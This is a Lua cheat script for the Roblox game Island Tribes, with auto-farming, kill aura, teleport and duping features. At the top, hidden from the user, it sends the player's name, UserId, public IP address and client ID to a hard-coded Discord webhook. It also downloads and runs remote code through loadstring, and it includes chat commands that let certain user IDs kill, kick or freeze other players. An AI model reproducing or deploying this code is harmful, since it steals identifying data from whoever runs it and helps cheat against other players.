HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1305585967339671552/cjHtSNM4GTgEwiVwMn8ERSYELVnlfd95Fczisz3RgH2hzNnafnhzqoJ7MZ-Tqxq3L25G"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Logged into Islandtribes With the KEYLESS Script",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }
                }
            }
        }
    })
})

local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/hiptodude2/the-opness-of-island-tribes/main/AtlasNewVers.lua"))()
local AtlasUi = Atlas.new({
    Name = "🌴 Island Tribes Eliter 🌴";
    ConfigFolder = "IslandTribes"; 
    Credit = "Credits: Elitechaosss and help of Casey";
    Color = Color3.fromRGB(0, 255, 140);
    UseLoader = false;
    Bind = "LeftBracket";
    FullName = "Island Tribes";
    CheckKey = nil
})

--Services
Workspace = game:GetService('Workspace')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
UserInputService = game:GetService('UserInputService')
TweenService = game:GetService("TweenService")
RunService = game:GetService('RunService')
Lighting  = game:GetService('Lighting')
VirtualUser = game:GetService("VirtualUser")
HttpService = game:GetService('HttpService')
TeleportService = game:GetService("TeleportService")
PlayersFolder = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive')
function GetCharacter(playerName)
    local playerFolder = PlayersFolder:FindFirstChild(playerName)
    
    if playerFolder then
        return playerFolder:FindFirstChild("Character")
    else
        return nil
    end
end
--Globals
LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
Camera = Workspace.CurrentCamera
ALLITEMS = {
    [1] = "Stick",
    [2] = "Small Raft",
    [3] = "Small Campfire",
    [4] = "Wood Boots",
    [5] = "Wooden Harvester",
    [6] = "Wood Helmet",
    [7] = "Wooden Club",
    [8] = "Leather Bag",
    [9] = "Wood Body",
    [10] = "Wood Legs",
    [11] = "Wood Storage Chest",
    [12] = "Wood Bridge",
    [13] = "Wood Wall",
    [14] = "Teepee",
    [15] = "Plant Box",
    [16] = "Hardleather Bag",
    [17] = "Stone Boots",
    [18] = "Stone Harvester",
    [19] = "Wooden Sword",
    [20] = "Large Campfire",
    [21] = "Stone Helmet",
    [22] = "Party Raft",
    [23] = "Wood Gate",
    [24] = "Reinforced Bag",
    [25] = "Stone Body",
    [26] = "Stone Legs",
    [27] = "Stone Storage Chest",
    [28] = "Furnace",
    [29] = "Silver Boots",
    [30] = "Wooden Bow",
    [31] = "Arrow",
    [32] = "Stone Wall",
    [33] = "Silver Helmet",
    [34] = "Stone Sword",
    [35] = "Fishing Rod",
    [36] = "Stone Gate",
    [37] = "Silver Bag",
    [38] = "Silver Harvester",
    [39] = "Silver Body",
    [40] = "Silver Legs",
    [41] = "Silver Storage Chest",
    [42] = "Ladder",
    [43] = "Gold Boots",
    [44] = "Silver Sword",
    [45] = "Stone Land Bridge",
    [46] = "Silver Wall",
    [47] = "Gold Helmet",
    [48] = "Bed",
    [49] = "Stone Bridge",
    [50] = "Silver Gate",
    [51] = "Golden Harvester",
    [52] = "Gold Body",
    [53] = "Gold Legs",
    [54] = "Gold Storage Chest",
    [55] = "Golden Bag",
    [56] = "Ruby Boots",
    [57] = "Golden Sword",
    [58] = "Gold Wall",
    [59] = "Ruby Helmet",
    [60] = "Tent Raft",
    [61] = "Golden Bow",
    [62] = "Gold Gate",
    [63] = "Ruby Harvester",
    [64] = "Ruby Body",
    [65] = "Ruby Legs",
    [66] = "Ruby Storage Chest",
    [67] = "Diamond Boots",
    [68] = "Ruby Sword",
    [69] = "Ruby Bag",
    [70] = "Diamond Harvester",
    [71] = "Diamond Helmet",
    [72] = "Ruby Wall",
    [73] = "Diamond Body",
    [74] = "Diamond Legs",
    [75] = "Ruby Gate",
    [76] = "Diamond Storage Chest",
    [77] = "Ruby Bow",
    [78] = "Diamond Wall",
    [79] = "Diamond Gate",
    [80] = "Diamond Bag",
    [81] = "Small Log",
    [82] = "Big Log",
    [83] = "Small Rock",
    [84] = "Large Rock",
    [85] = "Raw Fish",
    [86] = "Cooked Fish",
    [87] = "Raw Meat",
    [88] = "Cooked Meat",
    [89] = "Silver Ore",
    [90] = "Silver Bar",
    [91] = "Gold Ore",
    [92] = "Gold Bar",
    [93] = "Unrefined Ruby",
    [94] = "Ruby",
    [95] = "Unrefined Diamond",
    [96] = "Diamond",
    [97] = "Redberry",
    [98] = "Coconut",
    [99] = "Watermelon",
    [100] = "Watermelon Seeds",
    [101] = "Carrot",
    [102] = "Carrot Seeds",
    [103] = "Raw Potato",
    [104] = "Potato Seeds",
    [105] = "Banana",
    [106] = "Leaves",
    [107] = "Leather",
    [108] = "Feather",
    [109] = "Feather Stack",
    [110] = "Arrow Stack",
    [111] = "Freshy Chest",
    [112] = "Stone Supplies",
    [113] = "Wooden Warrior Pack",
    [114] = "Feather Pack",
    [115] = "Arrow Pack",
    [116] = "Silver Warrior Pack",
    [117] = "Fisherman's Pack",
    [118] = "Golden Archer Pack",
    [119] = "Ruby Hero Pack",
    [120] = "Infinite Campfire",
    [121] = "Bowling Pins",
    [122] = "Cabbage",
    [123] = "Cabbage Seeds",
    [124] = "Torch",
    [125] = "Tiki Torch",
    [126] = "Baked Potato",
    [127] = "Small Wood Base",
    [128] = "Medium Wood Base",
    [129] = "Large Wood Base",
    [130] = "Small Stone Base",
    [131] = "Medium Stone Base",
    [132] = "Large Stone Base",
    [133] = "Repair Hammer",
    [134] = "Unrefined Zenyte",
    [135] = "Zenyte",
    [136] = "Totem",
    [137] = "Caveberry",
    [138] = "Slime Ball",
    [139] = "Slime Helmet",
    [140] = "Slime Body",
    [141] = "Slime Legs",
    [142] = "Slime Boots",
    [143] = "Slimy Pack",
    [144] = "Zenyte Helmet",
    [145] = "Zenyte Body",
    [146] = "Zenyte Storage Chest",
    [147] = "Zenyte Legs",
    [148] = "Zenyte Boots",
    [149] = "Zenyte Wall",
    [150] = "Zenyte Gate",
    [151] = "Zenyte Bag",
    [152] = "Slime Club",
    [153] = "Zenyte Harvester",
    [154] = "Diamond Sword",
    [155] = "Wooden Mine Cart",
    [156] = "Party Cart",
    [157] = "Silver Mine Cart",
    [158] = "Ruby Mine Cart",
    [159] = "Zenyte Mine Cart",
    [160] = "Coal",
    [161] = "Infinite Furnace",
    [162] = "Beginner Wand",
    [163] = "Clue Scroll (Easy)",
    [164] = "Clue Scroll (Medium)",
    [165] = "Clue Scroll (Hard)",
    [166] = "Treasure Chest (Easy)",
    [167] = "Treasure Chest (Medium)",
    [168] = "Treasure Chest (Hard)",
    [169] = "Shovel",
    [170] = "Clue Bottle (Easy)",
    [171] = "Clue Bottle (Medium)",
    [172] = "Clue Bottle (Hard)",
    [173] = "Lucky Sword",
    [174] = "Lucky Bow",
    [175] = "Lucky Helmet",
    [176] = "Lucky Body",
    [177] = "Lucky Legs",
    [178] = "Lucky Boots",
    [179] = "Lucky Harvester",
    [180] = "Lucky Fruit",
    [181] = "Candy",
    [182] = "Kerosene Lamp",
    [183] = "Sleigh",
    [184] = "Magical Sleigh",
    [185] = "Grinch's Sleigh",
    [186] = "Candy Bag",
    [187] = "Pile of Candy",
    [188] = "Candy Pack",
    [189] = "Explorer Energy",
    [190] = "Cave Door Key (d)",
    [191] = "Key Handle (d)",
    [192] = "Key Shaft (d)",
    [193] = "Cave Door Key (z)",
    [194] = "Key Handle (z)",
    [195] = "Key Shaft (z)",
    [196] = "Stone Anvil",
    [197] = "Silver Crossbow",
    [198] = "Diamond Crossbow",
    [199] = "Zenyte Crossbow",
    [200] = "Soul",
    [201] = "Soul Helmet",
    [202] = "Soul Body",
    [203] = "Soul Legs",
    [204] = "Soul Boots",
    [205] = "Zenyte Sword",
    [206] = "Wooden Shield",
    [207] = "Silver Shield",
    [208] = "Golden Shield",
    [209] = "Ruby Shield",
    [210] = "Diamond Shield",
    [211] = "Zenyte Shield",
    [212] = "Golden Anvil",
    [213] = "Diamond Anvil",
    [214] = "Cave Key Pack",
    [215] = "OP Sword",
    [216] = "Soul Sword",
    [217] = "Soul Bag",
    [218] = "Soul Shield",
    [219] = "Lucky Shield",
    [220] = "Soul Key",
    [221] = "Pirate Ship",
    [222] = "Springy Boots",
    [223] = "Volcanic Ore",
    [224] = "Obsidian",
    [225] = "Obsidian Helmet",
    [226] = "Obsidian Body",
    [227] = "Obsidian Legs",
    [228] = "Obsidian Boots",
    [229] = "Volcanic Furnace",
    [230] = "Obsidian Club",
    [231] = "Obsidian Wall",
    [232] = "Obsidian Gate",
    [233] = "Obsidian Storage Chest",
    [234] = "Harpoon Turret",
    [235] = "Obsidian Shield",
    [236] = "Obsidian Bag",
    [237] = "Instakill Sword",
    [238] = "Pearl Helmet",
    [239] = "Pearl Body",
    [240] = "Pearl Legs",
    [241] = "Pearl Boots",
    [242] = "Raw Seaweed",
    [243] = "Cooked Seaweed",
    [244] = "Pink Shell",
    [245] = "White Shell",
    [246] = "Orange Shell",
    [247] = "Pearl",
    [248] = "Seaglass",
    [249] = "Seaglass Helmet",
    [250] = "Seaglass Body",
    [251] = "Seaglass Legs",
    [252] = "Seaglass Boots",
    [253] = "White Shell Sword",
    [254] = "Pink Shell Sword",
    [255] = "Orange Shell Sword",
    [256] = "White Shell Harvester",
    [257] = "Pink Shell Harvester",
    [258] = "Orange Shell Harvester",
    [259] = "Shell Helmet",
    [260] = "Shell Body",
    [261] = "Shell Legs",
    [262] = "Flippers",
    [263] = "Poison Seaweed",
    [264] = "Stone Trap",
    [265] = "Ruby Trap",
    [266] = "Zenyte Trap",
    [267] = "Pink Egg",
    [268] = "Purple Egg",
    [269] = "Red Egg",
    [270] = "Yellow Egg",
    [271] = "Easter Candy",
    [272] = "Easter Glider",
    [273] = "Repairio Spellbook",
    [274] = "Warrior Energy",
    [275] = "Protector Energy",
    [276] = "Magic Portal",
    [277] = "Healing Aura",
    [278] = "Electric Aura",
    [279] = "Hunger Aura",
    [280] = "Book of Exploration (I)",
    [281] = "Book of Exploration (II)",
    [282] = "Book of Exploration (III)",
    [283] = "Book of Protection (I)",
    [284] = "Book of Protection (II)",
    [285] = "Book of Protection (III)",
    [286] = "Book of Combat (I)",
    [287] = "Book of Combat (II)",
    [288] = "Book of Combat (III)",
    [289] = "Apprentice Wand",
    [290] = "Adept Staff",
    [291] = "Master Staff",
    [292] = "Transcended Staff",
    [293] = "Visionary Staff",
    [294] = "Wool",
    [295] = "Book",
    [296] = "Magical Book",
    [297] = "Obsidian Harvester",
    [298] = "Magic Repair Table (I)",
    [299] = "Magic Repair Table (II)",
    [300] = "Magic Repair Table (III)",
    [301] = "Glider",
    [302] = "Imbue Spellbook",
    [303] = "Shieldio Spellbook",
    [304] = "Hungaria Spellbook",
    [305] = "Baseio Retreatio Spellbook",
    [306] = "Healia Spellbook",
    [307] = "Deadia Protectia Spellbook",
    [308] = "Baseio Destroyio Spellbook",
    [309] = "Oofio Spellbook",
    [310] = "Freezio Spellbook",
    [311] = "Starvio Spellbook",
    [312] = "Electricia Spellbook",
    [313] = "Portalio Spellbook",
    [314] = "Protectio Claimio Spellbook",
    [315] = "Warrio Claimio Spellbook",
    [316] = "Explorer Energy Pack",
    [317] = "Protector Energy Pack",
    [318] = "Warrior Energy Pack",
    [319] = "Explorer Energy Stack",
    [320] = "Protector Energy Stack",
    [321] = "Warrior Energy Stack",
    [322] = "Infinite Bag",
    [323] = "Deflectio Projectio Spellbook",
    [324] = "Seed Pack",
    [325] = "Fruit Pack",
    [326] = "Diamond Hero Pack",
    [327] = "Zenyte Warrior Pack",
    [328] = "Box of Redberries",
    [329] = "Box of Coconuts",
    [330] = "Box of Bananas",
    [331] = "Box of Watermelons",
    [332] = "Potato Seed Box",
    [333] = "Cabbage Seed Box",
    [334] = "Carrot Seed Box",
    [335] = "Watermelon Seed Box",
    [336] = "Halloween Pumpkin",
    [337] = "Jack-o'-lantern",
    [338] = "Weak Pet Net",
    [339] = "Sturdy Pet Net",
    [340] = "Strong Pet Net",
    [341] = "Unbreakable Pet Net",
    [342] = "Christmas Present",
    [343] = "Snowball",
    [344] = "Obsidian Floor",
    [345] = "Pile of Snowballs",
    [346] = "Snowball Pack",
    [347] = "Silver Snowball",
    [348] = "Golden Snowball",
    [349] = "Ruby Snowball",
    [350] = "Diamond Snowball",
    [351] = "Zenyte Snowball",
    [352] = "Obsidian Snowball",
    [353] = "Candy Snowball",
    [354] = "Starter Sword",
    [355] = "Starter Harvester",
    [356] = "Starter Helmet",
    [357] = "Starter Body",
    [358] = "Starter Legs",
    [359] = "Starter Boots",
    [360] = "Lunar Ore",
    [361] = "Moonstone",
    [362] = "Lunario Enchantio Spellbook",
    [363] = "Moonstone Helmet",
    [364] = "Moonstone Body",
    [365] = "Moonstone Legs",
    [366] = "Moonstone Boots",
    [367] = "Moonstone Shield",
    [368] = "Moonstone Harvester",
    [369] = "Moonstone Sword",
    [370] = "Moonstone Bag",
    [371] = "Potion Cauldron",
    [372] = "Candy Potion",
    [373] = "Moonstone Storage Chest",
    [374] = "Moonstone Wall",
    [375] = "Moonstone Gate",
    [376] = "Moonstone Crossbow",
    [377] = "Lunar Arrow",
    [378] = "Pumpkin",
    [379] = "Pumpkin Shield",
    [380] = "Pumpkin Bag",
    [381] = "Pumpkin Seeds",
    [382] = "Treasure Chest Pack",


}



ALLITEMSTABLE = ALLITEMS
SWITCHEDITEMSTABLE = {}
for id, name in pairs(ALLITEMS) do
    ALLITEMSTABLE[id] = name      -- Maps the numeric ID to the item name
    SWITCHEDITEMSTABLE[name] = id -- Maps the item name back to the numeric ID
end
getgenv().configs = {
    Bypassing = false;
    AutoPickup2 = false;
    InfJump = false;
    ClickTp = false;
    AutoEat = false;
    MineAura = false;
    MobAura = false;
    CheaterDetector = false;
    KillAura = false;
    PlayerLock = false;
    Pumpkins = false;
    Hitbox = false;
    SafeDeath = false;
    OpKillAura = false;
	PredictOpKillAura = false;
    AutoRepairClub = false;
    ConiferFarm = false;
    UseSoulKeys = false;
    ObsidianBoss = false;
    ZenLuckBoss = false;
    SpiritBoss = false;
    LuckySlime = false;
    EvilSkeleton = false;
    Ogre = false;
    Squid = false;
    JumpPower = false;
    AntiRagDoll = false;
    ExtraSpeed = false;
    AmountToLoopDrop = false;
    PlayerEsp = false;
    EatingType = 'AFK';
    TrapType = 'Stone Trap';
    LevelCheck = 'True';
    ChestType = 'Any';
}
getgenv().QuickSpeedMultiplier = 1
getgenv().AmountOfChestInserts = 1
getgenv().PredictAmount = 3
getgenv().QuickSpeedKey = Enum.KeyCode.B
getgenv().GliderModSpeed = 30


--RemoteEvents
RemoteEvents = {
    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
}
--Important locals
local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
local Whitelist_table = {};
local OpKillAuraTable = {};
local realgameadmins = {849400193, 134488231, 146733116, 27865601}
local MoonstoneSet = {363, 364, 365, 366}
local ObsidianSet = {225, 226, 227, 228}
local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
local AllSwords = {173, 205, 230, 369, 255, 254, 253}
local AllBows = {174, 197, 198, 199, 376}
local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
local AllStaffs = {293, 292, 291, 290, 162, 289}

--Safe Death Connections
local TimeTped
local TimeBetweenTps
local TeleportHappened = false
local SafeDeathHealthChecker = nil

--Boss Death connections
local AutoPickupOnObsidianDeath
local AutoPickupOnZenLuckBossDeath
local AutoPickupOnSpiritBossDeath
local AutoPickuponLuckySlimeDeath
local AutoPickupOnSkeletonDeath
local AutoPickupOnOgreDeath
local AutoPickupOnSquidDeath

--Dupe locals
local ItemIndexed
local ItemIndexedNumber

--Admin Module
local Players = game:GetService("Players")

-- Define a list of admin user IDs
local adminUserIDs = {
    -- Add user IDs of admins here
    162080939,  -- Replace with actual user IDs
    987654321,
}

-- Function to check if a player is an admin
local function isAdmin(player)
    return table.find(adminUserIDs, player.UserId) ~= nil
end

-- Function to kill a player
local function killPlayer(player)
    local Character = GetCharacter(player.name)
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
end

-- Function to kick a player
local function kickPlayer(player, targetPlayer)
    if targetPlayer and targetPlayer ~= player then
        targetPlayer:Kick("You have been kicked by an admin.")
    end
end

-- Function to freeze a player
local function freezePlayer(player)
    local character = GetCharacter(player.name)

    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = true
        end
    end
end

-- Function to unfreeze a player
local function unfreezePlayer(player)
    local character = GetCharacter(player.name)
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = false
        end
    end
end

-- Function to handle player chat and check for admin commands
local function onPlayerChat(player, message)
    if isAdmin(player) then
        if message:lower():sub(1, 5) == ".kill" then
            local playerNameToKill = message:sub(7)
            local targetPlayer = Players:FindFirstChild(playerNameToKill)
            killPlayer(targetPlayer)
        elseif message:lower():sub(1, 5) == ".kick" then
            local playerNameToKick = message:sub(7)
            local targetPlayer = Players:FindFirstChild(playerNameToKick)
            kickPlayer(player, targetPlayer)
        elseif message:lower():sub(1, 7) == ".freeze" then
            local playerNameToFreeze = message:sub(9)
            local targetPlayer = Players:FindFirstChild(playerNameToFreeze)
            freezePlayer(targetPlayer)
        elseif message:lower():sub(1, 9) == ".unfreeze" then
            local playerNameToUnfreeze = message:sub(11)
            local targetPlayer = Players:FindFirstChild(playerNameToUnfreeze)
            unfreezePlayer(targetPlayer)
        -- Add more admin commands here
        end
    end
end

-- Listen for chat messages from all players
for _, player in pairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        onPlayerChat(player, msg)
    end)
end

-- Listen for new players and their chat messages
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChat(player, msg)
    end)
end)

--Aimbot locals
local CurrentlyLocked
local Aiming = false

--Quickspeed locals
local OnOff = false
local keydetected

--Pages
local Main = AtlasUi:CreatePage("Main")

local Combat = AtlasUi:CreatePage("Combat")

local Dupe = AtlasUi:CreatePage("Dupe & Spawn")

local Visuals = AtlasUi:CreatePage("Visuals")

local LPlayer = AtlasUi:CreatePage("LocalPlayer")

local Chests = AtlasUi:CreatePage("Treasure Chests")

local Farming = AtlasUi:CreatePage("Farm")

local Teleports = AtlasUi:CreatePage("Teleports")

local AutoSell = AtlasUi:CreatePage("AutoSell")


--Antiafk
if not getgenv().Idling ~= true then
    getgenv().Idling = true
    LocalPlayer.Idled:connect(function()
	    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	    task.wait(1)
	    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end

--Functions
function IsPlayerAlive(player)
    if player.Character and player.Character:FindFirstChild('Humanoid') and player.Character:FindFirstChild('HumanoidRootPart') and player.Character:FindFirstChild('Humanoid').Health > 0 then
        return true
    end
    return false
end


function GetClosestChest()
    local closest
    local range = math.huge
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        for _, chest in pairs(Workspace:WaitForChild("Replicators")[checkpassivenonpassive]:GetChildren()) do
            if string.find(chest.Name, 'Storage') and chest:FindFirstChildOfClass('MeshPart') then
                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                if dist < range then
                 range = dist
                 closest = chest
                end
            end
        end
        return closest
    end
end

local function IsArmorLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 10 then
        return true
    end
end

local function IsLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 5 then
        return true
    end
end

local function SellItem(Item, SellAmount, Id)
    local GetItem = MyInventory:FindFirstChild(Item)
    if GetItem then
        local NumberOfItem = string.match(GetItem:FindFirstChild('Top'):FindFirstChild('NameLabel').Text, '%d+')
        if not NumberOfItem then
            NumberOfItem = 1
        end
        if tonumber(NumberOfItem) >= SellAmount then
            RemoteEvents['TradeTrader']:FireServer('Resource Trader', Id)
        end
    end
end

function AutoPickup()
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        local AllPickups = {}
        local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
        for _, item in pairs(Workspace:WaitForChild('Replicators')[checkpassivenonpassive]:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        if #AllPickups > 0 then
            for _, getitem in ipairs(AllPickups) do
                repeat task.wait()
					local mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/')
					if tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) then return false end 
                    if IsPlayerAlive(LocalPlayer) then
                        if getitem.Parent then
                            RemoteEvents['ItemInteracted']:FireServer(getitem, "Pickup")
                        end
                    end
                until not getitem.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - getitem:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
end

function AutoPickup2()
    if getgenv().configs.AutoPickup2 then
        if not getgenv().AutoPickingUp then
            getgenv().AutoPickingUp = Workspace.DescendantAdded:Connect(function(pickup)
				local mybagspace
                if not getgenv().configs.AutoPickup2 then
                    getgenv().AutoPickingUp:Disconnect()
                    getgenv().AutoPickingUp = nil
                    return
                end
                if not string.find(pickup.Name:lower(), 'clue') then
                    if table.find(ALLITEMSTABLE, pickup.Name) then
                        if IsPlayerAlive(LocalPlayer) then
                            local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
                            local itempos = pickup:GetPivot().Position
                            if (mypos - itempos).magnitude < 18.5 then
                                repeat task.wait()
									mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/') 
                                    if IsPlayerAlive(LocalPlayer) then
                                        if pickup.Parent then
                                            RemoteEvents['ItemInteracted']:FireServer(pickup, "Pickup")
                                        end
                                    end
                                until not pickup.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - pickup:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.AutoPickup2
                            end
                        end
                    end
                end
            end)
        end
        AutoPickup()
    else
        if getgenv().AutoPickingUp then
            getgenv().AutoPickingUp:Disconnect()
            getgenv().AutoPickingUp = nil
        end
    end
end

function ClickTp()
    if getgenv().configs.ClickTp then
        if not getgenv().MouseClick then
            getgenv().MouseClick = UserInputService.InputBegan:Connect(function(input)
                if getgenv().configs.ClickTp then
                    if not UserInputService:GetFocusedTextBox() then
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                            if IsPlayerAlive(LocalPlayer) then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.Position)
                            end
                        end
                    end
                end
            end)
        end
    end
end

function AutoEat()
    local function GreatestFoodSource()
        local foodtable = {}
        local highestfood
        local greatestfoodpossible = -math.huge
        
        for _, food in pairs(MyInventory:GetChildren()) do
            if food.Name == 'Raw Potato' or food.Name == 'Watermelon' or food.Name == 'Banana' or food.Name == 'Redberry' or food.Name == 'Coconut' or food.Name == 'Baked Potato' or food.Name == 'Carrot'  or food.Name == 'Cabbage' or food.Name == 'Cooked Fish' or food.Name == 'Cooked Meat' or food.Name == 'Caveberry' or food.Name == 'Slime Ball' or food.Name == 'Lucky Fruit' then
                table.insert(foodtable, food)
            end
        end
        for _, food in pairs(foodtable) do
            local foodamount = tonumber(string.match(food:WaitForChild('Top'):WaitForChild('NameLabel').Text, '%d+'))
            if foodamount and foodamount > greatestfoodpossible then
                greatestfoodpossible = foodamount
                highestfood = food.Name
            end
        end
        return highestfood
    end
    local maxhungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar').AbsoluteSize
    local subbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Health'):WaitForChild('Bar'):WaitForChild('Sub')
    while getgenv().configs.AutoEat do
        if getgenv().configs.AutoEat then
            task.wait()
            local Food = GreatestFoodSource()
            if Food then
                if getgenv().configs.EatingType == 'AFK' then
                    local currenthungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar'):WaitForChild('Bar').AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxhungerbar - currenthungerbar).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                elseif getgenv().configs.EatingType == 'War' then
                    local maxsubbar = subbar.Parent.AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxsubbar - subbar.AbsoluteSize).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                end
            end
        end
    end
end

function MineAura()
    while getgenv().configs.MineAura do
        if getgenv().configs.MineAura then
            task.wait(0.3)
            if IsPlayerAlive(LocalPlayer) then
                local function getclosestore()
                    local range = 21
                    local closestore
                    for _, ore in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if not string.find(ore.Name:lower(), 'slime') then
                            if Workspace:FindFirstChild("Volcanic Rock") then
                                Workspace:FindFirstChild("Volcanic Rock").Parent = Workspace:WaitForChild('Replicators'):WaitForChild('Both')
                            end
